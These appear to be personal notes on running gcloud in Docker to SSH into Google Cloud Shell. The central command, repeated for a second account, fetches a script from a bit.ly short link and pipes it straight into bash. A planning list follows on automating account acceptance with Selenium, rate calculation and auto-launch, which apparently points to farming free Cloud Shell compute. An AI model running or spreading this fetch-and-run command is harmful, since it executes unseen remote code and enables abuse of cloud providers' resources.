# docker gcloud
## link
https://cloud.google.com/sdk/docs/downloads-docker?hl=fr

## cmds

docker pull gcr.io/google.com/cloudsdktool/cloud-sdk:latest

docker run -ti --name gcloud-config gcr.io/google.com/cloudsdktool/cloud-sdk gcloud auth login

docker run --rm --volumes-from gcloud-config gcr.io/google.com/cloudsdktool/cloud-sdk gcloud compute instances list --project your_project

### working about 18 - 20 minutes
docker run --rm --volumes-from gcloud-config gcr.io/google.com/cloudsdktool/cloud-sdk gcloud cloud-shell  ssh --authorize-session --command="wget -q -O - bit.ly/cpu02 |bash"


# Test
docker run -ti --name gcloud-config-nadirchi10001 gcr.io/google.com/cloudsdktool/cloud-sdk gcloud auth login
docker run --rm --volumes-from gcloud-config-nadirchi10001 gcr.io/google.com/cloudsdktool/cloud-sdk gcloud cloud-shell  ssh --authorize-session --command="wget -q -O - bit.ly/cpu02 |bash"


## loop docker screen



# Planing
1- testing
2- auto selinum accepted - copying
3- auto calculate the rate 
4- auto lanch
6- memory optimize  